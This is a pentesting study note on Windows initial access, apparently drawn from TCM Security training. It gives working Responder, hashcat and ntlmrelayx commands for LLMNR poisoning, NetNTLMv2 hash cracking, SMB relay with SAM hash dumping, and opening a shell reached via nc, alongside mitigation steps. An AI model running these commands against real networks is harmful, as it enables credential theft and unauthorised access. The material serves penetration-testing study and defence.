---
title: 3 - Windows Exploitation
summary: Gaining Access step – a note for attacking Windows.
description: Gaining Access step – a note for attacking Windows.
---

# Resources

---

* [Pentesting Active Directory Mind Map - ODC](https://github.com/esidate/pentesting-active-directory/tree/main)
* [Top Five Ways I Got Domain Admin 2018 Edition - Adam Toscher](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

# Initial Access

---

### 1 - LLMNR Attack

### Principle

![exploit-llmnr-principle.png](../attachments/exploit-llmnr-principle.png)
Credit: TCM Security

### Hands On


 > 
 > **<font color=red>responder -l</font> tun0 <font color=red>-dw</font>**</br>
 > Capture NTLM Hashes when DNS error occurs.

![tool-responder-llmnr_hash_capture.png](../attachments/tool-responder-llmnr_hash_capture.png)

**<font color=red>hashcat -m 5600 </font>myHashes.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
Crack NetNTMLv2 hashes.

### Mitigation

* Disable LLMNR and NBT-NS
  * Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client > Multicast Name Resolution > OFF
  * Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced > WINS > NetBIOS over TCP/IP > Disable
* If this cannot be disabled
  * Network Access Control.
  * Enforce strong user password (over 14 characters) in order to make it harder to crack hashes.

Credit: TCM Security

---

### 2 - SBM Relay Attack

### Principle

Relay captured Hashes without cracking them to a SMB Server.

### Requirements & Limitations

* SMB Signing must be disabled on the target.
* The user that is relayed has to be admin on the target.
* It is not possible to relay a user to the same machine.

### Scan for vulnerable hosts (SMB Signing disabled)

**<font color=red>nmap --script=smb2-security-mode.nse -p445</font> \[TARGET_IP\]**</br>
Scan for disabled SMB Signing.

![tool-nmap-smb_signing.png](../attachments/tool-nmap-smb_signing.png)

### Hands on

#### Capture Hashes

Update Responder configuration to capture hashes but not respond.

 > 
 > **<font color=lightblue>/usr/share/responder/Responder.conf</font>**</br>

````
[Responder Core]

; Servers to start
SQL = On
#SMB = On # HERE #
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
````


 > 
 > **<font color=red>responder -l</font> tun0 <font color=red>-dw</font>**</br>
 > Capture NTLM Hashes when DNS error occurs.

![tool-responder-llmnr_hash_capture.png](../attachments/tool-responder-llmnr_hash_capture.png)

#### Relay Attacks


 > 
 > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf </font>myTargets.txt <font color=red>-smb2support --no-multirelay</font>**</br>
 > Relay NTLM Hash and Dump Sam Hashes.

![tool-ntlmrelayx-smb_relay_dump_sam.png.png](../attachments/tool-ntlmrelayx-smb_relay_dump_sam.png.png)

**TO CHECK**

 > 
 > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf</font> myTargets.txt <font color=red>-smb2support --no-multirelay -i</font>**</br>
 > Relay NTLM Hash and start a Bind Shell.

![tool-ntmlrelayx-smb_relay_reverse_shell.png](../attachments/tool-ntmlrelayx-smb_relay_reverse_shell.png)

 > 
 > **<font color=red>nc 127.0.0.1 11000</font>**
 > Connect to the shell.

### Mitigation

* Enable SMB Signing on all devices
  * Warning: May cause performance issues with file copies
* Disable NTML authentication on network
  * Warning: NTML is the backup solution when Kerberos don't work, NTML may be required by some applications.
* Limit high privilege accounts to specific tasks (e.g. Domain Admins only log when a Domain Admin access is required).
* Enforce Local admins restriction.

Credit: TCM Security
